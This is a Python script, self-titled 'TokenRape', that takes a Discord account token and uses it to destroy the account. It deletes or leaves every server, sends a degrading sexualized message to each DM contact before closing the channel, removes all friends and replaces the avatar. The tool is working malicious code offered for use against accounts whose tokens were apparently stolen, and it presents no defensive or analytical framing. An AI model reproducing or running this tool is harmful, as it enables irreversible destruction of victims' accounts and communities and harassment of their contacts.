import base64, asyncio, json, os

try:
    import requests
    from colorama import Fore, init
except (ModuleNotFoundError):
    os.system('pip install requests colorama')

init(convert=True)

class Destruction:
    def __init__(self, token):
        self.api = 'https://discord.com/api/v8/'
        self.message = { 'content' : "", "tts" : "False", "embed": { "description": "This account was booty raped... "} }
        self.user = None
        self.token = token
        self.session = requests.Session()

    @property
    def headers(self):
        return { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "content-type": "application/json","authorization": self.token,'access-control-allow-headers': 'Content-Type, Authorization'}

    def setUser(self):
        _data = self.session.get(f'{self.api}users/@me', headers=self.headers)
        if _data.status_code < 400:
            self.user = _data.json()
        else:
            return False

    def deleteGuilds(self):
        guilds = self.session.get(f'{self.api}users/@me/guilds', headers=self.headers)
        if guilds.status_code < 400:
            for guild in guilds.json():
                if guild['owner'] == True:
                    print(f" > Deleted an owned guild: {guild['name']}")
                    self.session.post(f"{self.api}guilds/{guild['id']}/delete", headers=self.headers)
                elif guild['owner'] == False:
                    print(f" > Left a guild: {guild['name']}")
                    self.session.delete(f"{self.api}users/@me/guilds/{guild['id']}", json={}, headers=self.headers)

    def deleteFriends(self):
        friends = self.session.get(f'{self.api}users/@me/relationships', headers=self.headers)
        if friends.status_code < 400:
            for friend in friends.json():
                self.session.delete(f'{self.api}users/@me/relationships/{friend["id"]}', headers=self.headers)
                print(f" > Removed friend: {friend['user']['username']}")

    def deleteDms(self):
        response = self.session.get(f'{self.api}users/@me/channels', headers=self.headers)
        if response.status_code < 400:
            for channel in response.json():
                self.session.post(f'{self.api}channels/{channel["id"]}/messages', json=self.message, headers=self.headers)
                print(f" > Deleting dm channel of {channel['recipients'][0]['username']}")
                self.session.delete(self.api + f"channels/{channel['id']}", headers=self.headers)

    def setAvatar(self):
        email = self.user['email']
        username = self.user['username']
        avatar = base64.b64encode(open("../pfp.png", "rb").read()).decode("utf-8")
        _payload = {"avatar": f"data:image/jpeg;base64,{avatar}","discriminator": None,"email": email,"new_password": None,"password": "","username": username}

        self.session.patch(self.api + "users/@me", json=_payload, headers=self.headers)
        print(f" > Changed avatar.")

    def start(self):
        if self.setUser() == False:
            return
        self.setAvatar()
        self.deleteGuilds()
        self.deleteDms()
        self.deleteFriends()

if __name__ == "__main__":
    os.system('cls')
    os.system('title TokenRape - fweak')
    print(f'[{Fore.MAGENTA}TokenRape{Fore.RESET}] -> Token : ', end='')
    token = input('')

    rape = Destruction(token)
    rape.start()
    print(f'[{Fore.MAGENTA}TokenRape{Fore.RESET}] -> Done!')
    input('')
